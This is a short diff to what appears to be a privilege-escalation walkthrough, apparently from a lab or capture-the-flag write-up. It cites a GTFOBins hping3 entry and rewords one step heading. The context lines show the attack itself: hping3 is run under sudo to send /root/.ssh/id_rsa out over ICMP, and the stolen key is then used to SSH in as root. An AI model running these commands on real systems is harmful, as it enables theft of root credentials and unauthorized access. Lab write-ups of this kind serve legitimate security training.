@@ -19,7 +19,7 @@ Link: https://gtfobins.github.io/gtfobins/hping3/
 
     sudo /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
 
-### 4) SSH as root
+### 4) Copy the key on your machine, then SSH as root
 
     chmod 600 id_rsa
     ssh root@IP -i id_rsa
